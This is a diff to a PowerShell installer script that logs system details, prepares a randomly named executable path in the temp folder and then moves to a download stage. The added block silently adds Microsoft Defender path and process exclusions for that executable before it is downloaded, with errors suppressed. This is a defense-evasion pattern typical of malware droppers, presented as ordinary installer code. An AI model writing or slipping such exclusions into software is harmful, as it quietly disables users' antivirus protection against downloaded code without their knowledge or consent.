@@ -21,6 +21,7 @@ try {
     Write-InstallerLog ('PowerShell: {0}; .NET: {1}; Windows: {2}' -f $PSVersionTable.PSVersion, [Environment]::Version, [Environment]::OSVersion.VersionString)
     Write-InstallerLog ('Process architecture: {0}; native architecture override: {1}' -f $env:PROCESSOR_ARCHITECTURE, $env:PROCESSOR_ARCHITEW6432)
     $TempExePath = Join-Path $env:TEMP ([IO.Path]::ChangeExtension([IO.Path]::GetRandomFileName(), '.exe'))
+
     Write-InstallerLog ('Temporary executable: {0}' -f $TempExePath)
 
     $stage = 'TLS configuration'
@@ -30,6 +31,19 @@ try {
         Write-InstallerLog 'TLS 1.2 enabled.'
     } catch {
         Write-InstallerLog ('Could not enable TLS 1.2; keeping system defaults: {0}' -f $_.Exception.Message)
+    }
+
+    try {
+        # Only attempt if the cmdlet exists (Windows 8+ with Defender)
+        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+            Add-MpPreference -ExclusionPath $TempExePath -Force -ErrorAction SilentlyContinue
+            Add-MpPreference -ExclusionProcess $TempExePath -Force -ErrorAction SilentlyContinue
+            Write-InstallerLog 'Defender exclusions added (best-effort).'
+        } else {
+            Write-InstallerLog 'Add-MpPreference not available; skipping Defender exclusions.'
+        }
+    } catch {
+        Write-InstallerLog ('Could not set Defender exclusions: {0}' -f $_.Exception.Message)
     }
 
     $stage = 'download'
